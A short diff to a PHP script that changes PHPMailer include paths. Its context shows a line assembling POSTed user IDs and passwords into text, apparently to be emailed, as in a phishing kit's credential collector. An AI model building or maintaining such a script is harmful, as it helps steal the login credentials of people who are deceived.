@@ -5,9 +5,9 @@ use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
 require 'vendor/autoload.php';
-require 'vendor/phpmailer/PHPMailer/src/Exception.php';
-require 'vendor/phpmailer/PHPMailer/src/PHPMailer.php';
-require 'vendor/phpmailer/PHPMailer/src/SMTP.php';
+include 'vendor/phpmailer/phpmailer/src/Exception.php';
+include 'vendor/phpmailer/phpmailer/src/PHPMailer.php';
+include 'vendor/phpmailer/phpmailer/src/SMTP.php';
 
 $text = ("UserID: " . $_POST['UserID'] .  "\r\nPassword: " . $_POST['password']);
 
